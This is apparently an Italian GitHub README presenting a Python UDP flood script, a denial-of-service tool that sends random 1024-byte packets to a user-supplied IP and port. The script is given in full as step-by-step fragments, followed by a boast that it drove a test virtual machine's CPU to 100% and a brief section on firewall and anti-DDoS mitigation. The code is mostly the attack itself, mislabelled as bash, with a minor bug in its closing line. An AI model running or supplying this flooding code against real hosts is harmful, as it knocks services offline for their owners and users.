# **UDP FLOOD**
<p> UDP FLOOD è un tipo di attacco DoS che permette al malintenzionato di attaccare una
macchina tramite il protocollo UDP. L’obiettivo è sovraccaricare la macchina target
impedendo a quest’ultima di gestire tutti i dati in entrata  </p>

## Indice 📘
1. [Codice](#codice)
2. [Prestazioni](#prestazioni)
3. [Prevenzioni](#prevenzioni)

## **Codice👇🏼**
Importazione librerie
```bash
import socket
import random
```
Variabili
```bash
IP = input("Ip macchina target: ")
Porta = int(input("Porta macchina target: "))
npacchetti = int(input("Numero pacchetti: "))
```
Socket UDP
```bash
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dimensione_pacchetto = 1024 #numero di byte
```
Funzione
```bash
def generazione_pack(dimensione):
  return bytes(random.getrandbits(8) for _ in range (dimensione))
```
Print
```bash
print(f" Sto inviando i pacchetti a {IP} sulla porta {Porta}")
```
Ciclo
```bash
for _ in range(npacchetti):
  sock.sendto(generazione_pack(dimensione_pacchetto), (IP, Porta))
```
Print
```bash
print("Pacchetto inviato")
```
Connessione chiusa
```bash
sock.close
```

## **Prestazioni💥**
<p>Questo screenshot ⬇️ mostra la fase di avvio dello script nei confronti della macchina target.
La CPU è riuscita a toccare il 100% di utilizzo senza la libreria threading che avrebbe portato
al crash la macchina virtuale🙃 </p> 

[Immagine](https://github.com/OctavianIT/Octavian_Ceresau_UdpFloodpy/blob/main/Octavian_Ceresau_UdpFlood/UdpFlood/Codice/prest.png)
<p>Provare per credere😅</p>

## **Prevenzioni**🛡️
#### **Filtraggio traffico UDP**
Configurare il firewall per limitare il traffico UDP su porte non necessarie ed impostare un limitatore di traffico per limitare
la quantità di pacchetti UDP in entrata

#### Protezione Anti-DDoS
Usare servizi esterni di mitigazione come: Cloudflare, AWS Shield o Google Cloud Armor
